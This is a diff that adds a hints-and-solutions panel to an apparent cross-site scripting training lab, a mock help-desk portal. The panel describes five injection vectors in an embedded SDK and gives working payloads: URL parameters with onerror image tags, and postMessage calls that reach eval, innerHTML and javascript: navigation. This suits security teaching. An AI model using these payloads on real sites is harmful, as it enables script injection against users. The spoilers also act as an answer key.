@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>HelpDesk Pro - Customer Portal</title>
+  <link rel="stylesheet" href="/css/hint-panel.css">
   <style>
     *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:#fff;color:#1e293b}
     .hd-nav{background:#fff;border-bottom:1px solid #e5e7eb;height:56px;display:flex;align-items:center;padding:0 32px;justify-content:space-between}.hd-nav .brand{font-weight:800;font-size:17px;color:#0ea5e9}.hd-nav .links{display:flex;gap:24px;font-size:14px}.hd-nav .links a{color:#6b7280;text-decoration:none;font-weight:500}.hd-nav .links a:hover{color:#111827}.hd-nav .right{display:flex;align-items:center;gap:12px;font-size:13px;color:#6b7280}
@@ -78,7 +79,86 @@
   -->
   <script src="/js/apps/embed-sdk.min.js"></script>
   <script>EmbedKit.init();</script>
+
+  <button class="stuck-btn" onclick="toggleHints()"><span class="q">💡</span> Stuck?</button>
+  <div class="hint-backdrop" id="hintBackdrop" onclick="toggleHints()"></div>
+  <div class="hint-panel" id="hintPanel">
+    <div class="hint-header">
+      <h2>Hint: HelpDesk (EmbedKit — 5 Vectors)</h2>
+      <button class="hint-close" onclick="toggleHints()">×</button>
+    </div>
+    <div class="hint-body">
+      <div class="hint-intro">EmbedKit is the attack surface. Beautify <code>embed-sdk.min.js</code> and look at <code>E.init</code>, <code>E.Banner</code>, <code>E.Tooltip</code>, and <code>E.MessageBus</code>. There are 5 distinct ways in.</div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">1</div><span>Vector 1: banner param</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <code>E.init</code> reads <code>?ek-banner=</code> and calls <code>Banner.show</code>, which does <code>banner.innerHTML = '&lt;span&gt;'+content+'&lt;/span&gt;...'</code>. Payload: <code>?ek-banner=&lt;img src=x onerror=alert(1)&gt;</code>
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">2</div><span>Vector 2: URL-based tooltip</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <code>Tooltip.showFromURL</code> reads <code>?ek-tip=</code> or <code>?tooltip=</code> and calls <code>Tooltip.show(target, decoded, {html:true})</code>. With <code>html:true</code>, the content goes to <code>tip.innerHTML</code>. Payload: <code>?tooltip=&lt;img src=x onerror=alert(1)&gt;</code>.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">3</div><span>Vector 3: postMessage ek:render</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <code>MessageBus</code> handles <code>ek:render</code> messages. The handler creates a <code>createContextualFragment</code> on <code>data.html</code>! Send from any frame/window:
+          <pre><code>window.postMessage({type:'ek:render', target:'ek-widget-render-target', html:'&lt;img src=x onerror=alert(1)&gt;'}, '*')</code></pre>
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">4</div><span>Vector 4: postMessage ek:eval</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          The same <code>MessageBus</code> handles <code>ek:eval</code> with <code>(0,eval)(data.code)</code>. Yes, really. Payload:
+          <pre><code>window.postMessage({type:'ek:eval', code:'alert(1)'}, '*')</code></pre>
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">5</div><span>Vector 5: ek:navigate to javascript:</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <code>ek:navigate</code> sets <code>window.location.href = data.url</code>. A <code>javascript:</code> URI executes. Payload:
+          <pre><code>window.postMessage({type:'ek:navigate', url:'javascript:alert(1)'}, '*')</code></pre>
+        </div>
+      </div>
+
+      <div class="hint-spoiler">
+        <button class="hint-spoiler-btn" onclick="this.parentElement.classList.toggle('open')">🚩 Full Solutions</button>
+        <div class="hint-spoiler-content">
+          <p><strong>Easiest (URL only):</strong></p>
+          <pre>?ek-banner=&lt;img src=x onerror=alert('XSS')&gt;</pre>
+          <p><strong>Via tooltip:</strong></p>
+          <pre>?tooltip=&lt;img src=x onerror=alert(1)&gt;</pre>
+          <p><strong>Via postMessage (run in the page's own console or from an iframe):</strong></p>
+          <pre>postMessage({type:'ek:eval', code:'alert("EVAL_XSS")'}, '*')</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
   <script src="/js/app.js"></script>
-  <script>setupLabVerification('xss-hunt-4', 'xss');</script>
+  <script>
+    setupLabVerification('xss-hunt-4', 'xss');
+    function toggleHints() {
+      document.getElementById('hintPanel').classList.toggle('open');
+      document.getElementById('hintBackdrop').classList.toggle('show');
+    }
+  </script>
 </body>
 </html>
